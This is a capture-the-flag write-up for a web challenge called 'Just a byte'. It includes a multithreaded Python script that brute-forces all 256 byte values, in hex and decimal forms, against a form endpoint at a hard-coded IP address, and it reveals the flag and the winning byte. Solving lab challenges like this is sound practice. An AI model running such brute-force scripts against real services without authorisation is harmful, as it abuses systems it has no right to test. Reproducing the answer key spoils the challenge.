# Just a byte

We have a web page that simply says: ***“Just give me a byte.”***. Also having with a form that submits a value using the POST method to /byt3. If the input is wrong, it returns: *Not the right one.*

There’s likely a single valid byte expected by the backend. The input form uses the name message, and the goal is to discover what valid input (1 byte in some form) will result in getting the flag.

```html
<form action="/byt3" method="post">
  <input type="text" name="msg" id="msg">
  <input type="hidden" name="message" id="message">
  <input type="submit" value="Submit">
</form>
```

The input from msg is copied into the hidden message field via JavaScript before submission. So the final submitted key is always message, and this is what the server checks.

The core idea is to brute-force all possible byte values, submitted in multiple formats:
- Hexadecimal: lowercase (00 to ff)
- Hexadecimal: uppercase (00 to FF)
- Decimal: (0 to 255)

The goal is to trigger any response different from "Not the right one.".

## Exploit Script

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://141.85.224.118:5005/byt3"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

# build payload list: (label, ascii_string)
payloads = []
for i in range(256):
    # 2-digit hex, lowercase + uppercase as the app is case sensitive
    payloads.append((f"hex_{i:02x}",  f"{i:02x}"))
    payloads.append((f"HEX_{i:02X}",  f"{i:02X}"))
    
    # decimal
    payloads.append((f"dec_{i}",      str(i)))


def try_payload(label, msg):
    data = {"message": msg}
    try:
        r = requests.post(url, headers=headers, data=data, timeout=4)
        txt = r.text.strip()
        print(f"[*] {label:10} → '{msg}' → {txt[:40]!r}")
        if txt != "Not the right one.":
            return f"\nFound byte: {label}: '{msg}'\n{txt}\n"
            break
    except Exception as e:
        return f"[!] Error {label}: {e}"
    return None


with ThreadPoolExecutor(max_workers=60) as ex:
    futures = [ex.submit(try_payload, lab, m) for lab, m in payloads]
    for fut in as_completed(futures):
        res = fut.result()
        if res:
            print(res)
            break
```

When executed, the script quickly identifies the correct byte format accepted by the backend. And the flag was: **SSS{d1d_you_try_th3m_all}** at byte **d8**.
